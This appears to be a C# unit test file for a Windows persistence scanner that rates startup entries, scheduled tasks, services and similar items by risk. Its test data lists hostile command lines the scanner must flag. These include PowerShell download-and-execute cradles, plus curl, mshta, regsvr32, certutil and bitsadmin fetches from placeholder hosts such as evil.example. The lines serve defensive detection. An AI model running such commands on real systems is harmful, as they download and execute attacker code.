using PCPorter.Collectors.Persistence;

namespace PCPorter.Collectors.Tests.Persistence;

public class PersistenceRulesTests
{
    static readonly SignatureInfo Ms = new(SignatureStatus.Valid, "Microsoft Windows", true);
    static readonly SignatureInfo Unsigned = new(SignatureStatus.Unsigned, null, false);
    static readonly SignatureInfo Invalid = new(SignatureStatus.Invalid, "Tampered Ltd", false);
    static readonly SignatureInfo Missing = new(SignatureStatus.FileMissing, null, false);
    static readonly SignatureInfo NotChecked = new(SignatureStatus.NotChecked, null, false);
    static SignatureInfo Signed(string who) => new(SignatureStatus.Valid, who, false);

    static RuleResult Score(string command, SignatureInfo sig, EntryKind kind = EntryKind.Autostart, string? payload = null,
        bool disabled = false, bool taskHidden = false, string name = "Thing", string? script = null, Func<string, bool>? exists = null)
    {
        var e = new PersistenceEntry("Loc", name, command, kind) { Disabled = disabled, TaskHidden = taskHidden, ScriptText = script };
        var parsed = CommandLine.Parse(command, exists);
        return PersistenceRules.Score(new RuleInput(e, parsed, payload ?? parsed.Payload, sig));
    }

    [Fact]
    public void Leftover_task_with_nothing_to_run_is_harmless()
    {
        var e = new PersistenceEntry(@"Task Scheduler\Microsoft\Windows\Application Experience", "AitAgent", "", EntryKind.Task) { TaskHidden = true, NoFile = true };
        var parsed = CommandLine.Parse("", null);
        Is(PersistenceRules.Score(new RuleInput(e, parsed, parsed.Payload, new SignatureInfo(SignatureStatus.NotChecked, null, false))), "TASK_LEFTOVER", Severity.Info);
    }

    static void Is(RuleResult r, string id, Severity s)
    {
        Assert.Equal(id, r.RuleId);
        Assert.Equal(s, r.Severity);
        Assert.False(string.IsNullOrWhiteSpace(r.Reason));
    }

    // ---- one test per row ----

    [Fact] public void Row01_wmi_consumer() => Is(Score(@"C:\Windows\System32\cmd.exe /c calc", Ms, EntryKind.WmiConsumer), "WMI_CONSUMER", Severity.High);

    [Fact]
    public void Row02_accessibility_replaced()
    {
        Is(Score(@"%SystemRoot%\System32\sethc.exe", Unsigned, EntryKind.Accessibility, name: "sethc.exe"), "ACCESSIBILITY_REPLACED", Severity.High);
        Is(Score(@"%SystemRoot%\System32\sethc.exe", Signed("Evil Corp"), EntryKind.Accessibility), "ACCESSIBILITY_REPLACED", Severity.High);
        Is(Score(@"%SystemRoot%\System32\sethc.exe", Ms, EntryKind.Accessibility), "MICROSOFT", Severity.Hidden);
        Is(Score(@"%SystemRoot%\System32\sethc.exe", NotChecked, EntryKind.Accessibility), "NOT_VERIFIABLE", Severity.Info);
    }

    [Fact]
    public void Row03_ifeo_debugger_and_signed_debugger_is_low()
    {
        Is(Score(@"C:\Users\Public\x.exe", Unsigned, EntryKind.IfeoDebugger, name: "sethc.exe"), "IFEO_DEBUGGER", Severity.High);
        Is(Score(@"""C:\Tools\procexp64.exe""", Ms, EntryKind.IfeoDebugger, name: "taskmgr.exe"), "IFEO_DEBUGGER", Severity.Low);
        Is(Score(@"""C:\Windows\system32\vsjitdebugger.exe""", Ms, EntryKind.IfeoDebugger), "IFEO_DEBUGGER", Severity.Low);
        Is(Score(@"C:\Tools\procexp64.exe", Unsigned, EntryKind.IfeoDebugger), "IFEO_DEBUGGER", Severity.High);
        Is(Score(@"C:\Windows\System32\cmd.exe", Ms, EntryKind.IfeoDebugger), "IFEO_DEBUGGER", Severity.High);
    }

    [Fact] public void Row04_winlogon_changed() => Is(Score(@"C:\evil.exe", Ms, EntryKind.Winlogon, name: "Userinit"), "WINLOGON_CHANGED", Severity.High);
    [Fact] public void Row05_dll_injection() => Is(Score(@"C:\x\inject.dll", Ms, EntryKind.DllInjection), "DLL_INJECTION", Severity.High);
    [Fact] public void Row06_com_hijack() => Is(Score(@"C:\Users\bob\AppData\x.dll", Signed("Someone"), EntryKind.ComHijack), "COM_HIJACK", Severity.High);

    [Theory]
    [InlineData(@"powershell.exe -enc SQBFAFgA")]
    [InlineData(@"powershell.exe -EncodedCommand SQBFAFgA")]
    [InlineData(@"powershell -nop -w hidden -c ""iex (irm http://x)""")]                // weak + strong: strong wins
    [InlineData(@"powershell -c ""iex (New-Object Net.WebClient).DownloadString('x')""")]
    [InlineData(@"powershell -c ""[Convert]::FromBase64String('x')""")]
    [InlineData(@"powershell -c ""iwr http://x/a.exe -o a.exe""")]
    [InlineData(@"powershell -c ""Invoke-WebRequest http://x""")]
    [InlineData(@"cmd /c curl http://evil.example/a -o a.exe")]
    [InlineData(@"mshta http://evil.example/a.hta")]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication"";alert(1)")]
    [InlineData(@"regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll")]
    [InlineData(@"certutil -urlcache -split -f http://x/a.exe a.exe")]
    [InlineData(@"bitsadmin /transfer job http://x/a.exe C:\a.exe")]
    [InlineData(@"wscript.exe ""C:\Users\bob\AppData\Roaming\x.vbs""")]
    [InlineData(@"C:\Users\bob\AppData\Local\run.js")]
    public void Row07_suspicious_command(string command) => Is(Score(command, Ms), "SUSPICIOUS_COMMAND", Severity.High);

    /// <summary>PC makers' own tasks use these alone: unusual, not alarming.</summary>
    [Theory]
    [InlineData(@"powershell -w hidden -c ""Get-Date""")]
    [InlineData(@"powershell -WindowStyle Hidden -File C:\a.ps1")]
    [InlineData(@"powershell -nop -c ""x""")]
    public void Row07_hidden_window_or_nop_alone_is_medium(string command) => Is(Score(command, Ms), "SUSPICIOUS_COMMAND", Severity.Medium);

    [Fact]
    public void Extension_from_outside_the_store_is_unusual()
    {
        Is(Score("abcd;https://evil.example/u.xml", NotChecked, EntryKind.BrowserExtension), "EXTENSION_OFF_STORE", Severity.Medium);
        Is(Score("abcd;https://clients2.google.com/service/update2/crx", NotChecked, EntryKind.BrowserExtension), "NOT_VERIFIABLE", Severity.Info);
        Is(Score("abcd", NotChecked, EntryKind.BrowserExtension), "NOT_VERIFIABLE", Severity.Info);
        // Policy-forced: judged once, by the posture check "Forced browser extensions", not again here.
        var policy = new PersistenceEntry(@"HKLM\SOFTWARE\Policies\Google\Chrome", "ExtensionSettings: abcd", "abcd;https://evil.example/u.xml", EntryKind.BrowserExtension) { NoFile = true };
        Is(PersistenceRules.Score(new RuleInput(policy, CommandLine.Parse(policy.Command), null, NotChecked)), "NOT_VERIFIABLE", Severity.Info);
    }

    [Fact]
    public void Signed_adware_publisher_is_unusual()
    {
        Is(Score(@"C:\Users\bob\AppData\Local\OneLaunch\onelaunch.exe", Signed("OneLaunch Technologies Inc.")), "UNWANTED_PUBLISHER", Severity.Medium);
        Is(Score(@"C:\Users\bob\AppData\Local\WaveBrowser\wavebrowser.exe", Signed("Wavesor Software (Eightpoint Technologies Ltd. SEZC)")), "UNWANTED_PUBLISHER", Severity.Medium);
    }

    [Fact]
    public void Whql_driver_is_not_treated_as_microsoft()
    {
        var whql = new SignatureInfo(SignatureStatus.Valid, "Microsoft Windows Hardware Compatibility Publisher", false);
        Is(Score(@"C:\Windows\System32\drivers\netfilter.sys", whql, EntryKind.Service), "WHQL_DRIVER", Severity.Info);
        Assert.False(PCPorter.Collectors.Signing.SignerNames.IsMicrosoft("Microsoft Windows Hardware Compatibility Publisher"));
        Assert.False(PCPorter.Collectors.Signing.SignerNames.IsMicrosoft("Microsoft 3rd Party Application Component"));
        Assert.True(PCPorter.Collectors.Signing.SignerNames.IsMicrosoft("Microsoft Windows"));
        Assert.True(PCPorter.Collectors.Signing.SignerNames.IsMicrosoft("Microsoft Corporation"));
    }

    [Theory]
    [InlineData(@"C:\Windows\explorer.exe C:\Users\bob\AppData\Roaming\x.vbs", "a file in the AppData folder")]
    [InlineData(@"C:\Windows\System32\conhost.exe --headless C:\Users\Public\run.bat", @"a file in the shared Users\Public folder")]
    [InlineData(@"C:\Windows\System32\msiexec.exe /i https://evil.example/a.msi /qn", "something from the internet")]
    [InlineData(@"C:\Windows\System32\forfiles.exe /c ""C:\ProgramData\Updater\u.exe""", "a file in the ProgramData folder")]
    public void Microsoft_program_starting_a_user_file_is_not_hidden(string command, string what)
    {
        var r = Score(command, Ms);
        Is(r, "LAUNCHER_ARGS", Severity.Medium);
        Assert.Contains(what, r.Reason);
    }

    [Fact]
    public void Microsoft_program_with_normal_arguments_stays_hidden() =>
        Is(Score(@"C:\Windows\System32\SecurityHealthSystray.exe /background", Ms), "MICROSOFT", Severity.Hidden);

    [Fact]
    public void Unsigned_in_programdata_is_like_appdata()
    {
        Is(Score(@"C:\ProgramData\Updater\updater.exe", Unsigned), "UNSIGNED_APPDATA", Severity.Medium);
        Is(Score(@"C:\ProgramData\x7f3kq9zpw\x7f3kq9zpw.exe", Unsigned), "UNSIGNED_RISKY_PATH", Severity.High);
        Is(Score(@"C:\ProgramData\Microsoft\Windows Defender\x.exe", Unsigned), "UNSIGNED", Severity.Medium);
    }

    [Fact]
    public void Row07_suspicious_script_content() =>
        Is(Score(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\go.bat", Signed("x"), EntryKind.File, script: "@echo off\r\npowershell -enc AAAA"), "SUSPICIOUS_COMMAND", Severity.High);

    [Fact]
    public void Row07_normal_switches_are_not_suspicious()
    {
        Is(Score(@"powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\backup.ps1", Ms, payload: @"C:\Scripts\backup.ps1"), "MICROSOFT", Severity.Hidden);
        Is(Score(@"""C:\Program Files\Teams\teams.exe"" --process-start-args ""--system-initiated""", Signed("Microsoft Corporation")), "SIGNED_THIRD_PARTY", Severity.Info);
    }

    [Fact] public void Row08_task_hidden() => Is(Score(@"C:\Windows\System32\cmd.exe", Ms, EntryKind.Task, taskHidden: true), "TASK_HIDDEN", Severity.High);

    [Theory]
    [InlineData(@"C:\Users\bob\AppData\Local\Temp\x.exe")]
    [InlineData(@"C:\Windows\Temp\x.exe")]
    [InlineData(@"C:\Users\bob\Downloads\setup.exe")]
    [InlineData(@"C:\Users\Public\x.exe")]
    [InlineData(@"%TEMP%\x.exe")]
    [InlineData(@"C:\Users\bob\AppData\Roaming\a8f3c2d1e9.exe")]
    [InlineData(@"C:\Users\bob\AppData\Roaming\{6F9619FF-8B86-D011-B42D-00C04FC964FF}.exe")]
    [InlineData(@"C:\Users\bob\AppData\Local\xkq7zt92w.exe")]
    public void Row09_unsigned_in_risky_path(string path) => Is(Score(path, Unsigned), "UNSIGNED_RISKY_PATH", Severity.High);

    [Fact] public void Row09_invalid_signature_counts_as_unsigned() => Is(Score(@"C:\Users\Public\x.exe", Invalid), "UNSIGNED_RISKY_PATH", Severity.High);

    [Fact] public void Row10_unsigned_in_appdata() => Is(Score(@"C:\Users\bob\AppData\Roaming\Spotify\Spotify.exe", Unsigned), "UNSIGNED_APPDATA", Severity.Medium);

    [Fact]
    public void Row11_unquoted_service_path()
    {
        var exists = (string p) => p == @"C:\Program Files\Vendor Tool\svc.exe";
        Is(Score(@"C:\Program Files\Vendor Tool\svc.exe -service", Signed("Vendor"), EntryKind.Service, exists: exists), "UNQUOTED_SERVICE_PATH", Severity.Medium);
        Is(Score(@"""C:\Program Files\Vendor Tool\svc.exe"" -service", Signed("Vendor"), EntryKind.Service, exists: exists), "SIGNED_THIRD_PARTY", Severity.Info);
        // Not a service: an unquoted Run value is not this rule.
        Is(Score(@"C:\Program Files\Vendor Tool\svc.exe -service", Signed("Vendor"), EntryKind.Autostart, exists: exists), "SIGNED_THIRD_PARTY", Severity.Info);
    }

    [Fact] public void Row12_unsigned_elsewhere() => Is(Score(@"C:\Tools\x.exe", Unsigned), "UNSIGNED", Severity.Medium);
    [Fact] public void Row13_file_missing() => Is(Score(@"C:\Program Files\Gone\gone.exe", Missing), "FILE_MISSING", Severity.Low);

    [Fact]
    public void Row14_oem_allowlist()
    {
        Is(Score(@"""C:\Program Files\HP\HP Support\hpsa.exe""", Signed("HP Inc.")), "OEM_KNOWN", Severity.Info);
        Is(Score(@"C:\Windows\System32\DriverStore\FileRepository\realtek.inf_amd64_1\RtkAudUService64.exe", Signed("Realtek Semiconductor Corp.")), "OEM_KNOWN", Severity.Info);
        Is(Score(@"""C:\Program Files\NVIDIA Corporation\Display\nvtray.exe""", Signed("NVIDIA Corporation")), "OEM_KNOWN", Severity.Info);
        // Right signer, wrong folder: just signed third party.
        Is(Score(@"C:\Users\bob\AppData\Local\hp.exe", Signed("HP Inc.")), "SIGNED_THIRD_PARTY", Severity.Info);
        // Right folder, other signer.
        Is(Score(@"""C:\Program Files\HP\x.exe""", Signed("Some Other Co")), "SIGNED_THIRD_PARTY", Severity.Info);
    }

    [Fact] public void Row15_signed_third_party() => Is(Score(@"""C:\Program Files\Spotify\Spotify.exe""", Signed("Spotify AB")), "SIGNED_THIRD_PARTY", Severity.Info);
    [Fact] public void Row16_microsoft_is_hidden() => Is(Score(@"C:\Windows\System32\SecurityHealthSystray.exe", Ms), "MICROSOFT", Severity.Hidden);
    [Fact] public void Row17_not_verifiable() => Is(Score(@"C:\Tools\x.exe", NotChecked), "NOT_VERIFIABLE", Severity.Info);

    // ---- first match wins ----

    [Fact] public void Missing_file_with_encoded_command_is_suspicious_not_missing() =>
        Is(Score(@"C:\Gone\powershell.exe -enc AAAA", Missing), "SUSPICIOUS_COMMAND", Severity.High);

    [Fact] public void Location_rules_beat_signature_rules() =>
        Is(Score(@"C:\Users\Public\x.exe", Unsigned, EntryKind.Winlogon), "WINLOGON_CHANGED", Severity.High);

    [Fact] public void Wmi_beats_suspicious() => Is(Score(@"powershell -enc AAAA", Ms, EntryKind.WmiConsumer), "WMI_CONSUMER", Severity.High);

    [Fact] public void Suspicious_beats_hidden_task() => Is(Score(@"powershell -enc AAAA", Ms, EntryKind.Task, taskHidden: true), "SUSPICIOUS_COMMAND", Severity.High);

    [Fact] public void Hidden_task_beats_unsigned_temp() => Is(Score(@"C:\Windows\Temp\x.exe", Unsigned, EntryKind.Task, taskHidden: true), "TASK_HIDDEN", Severity.High);

    [Fact] public void Risky_path_beats_appdata() => Is(Score(@"C:\Users\bob\AppData\Local\Temp\updater.exe", Unsigned), "UNSIGNED_RISKY_PATH", Severity.High);

    [Fact] public void Unquoted_service_beats_plain_unsigned() =>
        Is(Score(@"C:\Program Files\Vendor Tool\svc.exe", Unsigned, EntryKind.Service, exists: _ => true), "UNQUOTED_SERVICE_PATH", Severity.Medium);

    [Fact] public void Unsigned_appdata_beats_unquoted_service() =>
        Is(Score(@"C:\Users\bob\AppData\Local\Vendor Tool\svc.exe", Unsigned, EntryKind.Service, exists: _ => true), "UNSIGNED_APPDATA", Severity.Medium);

    // ---- modifier ----

    [Fact]
    public void Disabled_lowers_one_level()
    {
        var r = Score(@"C:\Users\Public\x.exe", Unsigned, disabled: true);
        Is(r, "UNSIGNED_RISKY_PATH", Severity.Medium);
        Assert.True(r.Disabled);
        Assert.Contains("turned off", r.Reason);
        Is(Score(@"""C:\Program Files\Spotify\Spotify.exe""", Signed("Spotify AB"), disabled: true), "SIGNED_THIRD_PARTY", Severity.Hidden);
        Is(Score(@"C:\Windows\System32\x.exe", Ms, disabled: true), "MICROSOFT", Severity.Hidden);
        Assert.False(Score(@"C:\Tools\x.exe", Unsigned).Disabled);
    }

    // ---- helpers ----

    [Theory]
    [InlineData("explorer.exe", true)]
    [InlineData("Explorer.exe ", true)]
    [InlineData(@"C:\Windows\explorer.exe", true)]
    [InlineData(@"explorer.exe, C:\evil.exe", false)]
    [InlineData(@"C:\evil.exe", false)]
    public void Default_shell(string v, bool expected) => Assert.Equal(expected, PersistenceRules.IsDefaultShell(v));

    [Theory]
    [InlineData(@"C:\Windows\system32\userinit.exe", true)]
    [InlineData(@"D:\WINDOWS\System32\userinit.exe", true)]
    [InlineData(@"%SystemRoot%\system32\userinit.exe", true)]
    [InlineData("userinit.exe", true)]
    [InlineData("", true)]
    [InlineData(@"C:\Users\Public\userinit.exe", false)]
    [InlineData(@"C:\evil.exe", false)]
    public void Default_userinit_parts(string v, bool expected) => Assert.Equal(expected, PersistenceRules.IsDefaultUserinitPart(v));

    [Fact]
    public void Default_boot_execute_and_lsa()
    {
        Assert.True(PersistenceRules.IsDefaultBootExecute("autocheck  autochk *"));
        Assert.False(PersistenceRules.IsDefaultBootExecute("autocheck evil *"));
        Assert.True(PersistenceRules.IsKnownLsaPackage("Security Packages", "\"\""));
        Assert.True(PersistenceRules.IsKnownLsaPackage("Authentication Packages", "msv1_0"));
        Assert.True(PersistenceRules.IsKnownLsaPackage("Notification Packages", "scecli"));
        Assert.False(PersistenceRules.IsKnownLsaPackage("Security Packages", "mimilib"));
    }

    [Theory]
    [InlineData("a8f3c2d1e9", true)]
    [InlineData("{6F9619FF-8B86-D011-B42D-00C04FC964FF}", true)]
    [InlineData("xkq7zt92w", true)]
    [InlineData("Spotify", false)]
    [InlineData("OneDrive", false)]
    [InlineData("updater2024", false)]
    [InlineData("deadbeef", false)]
    public void Random_looking_names(string stem, bool expected) => Assert.Equal(expected, PersistenceRules.IsRandomLooking(stem));
}
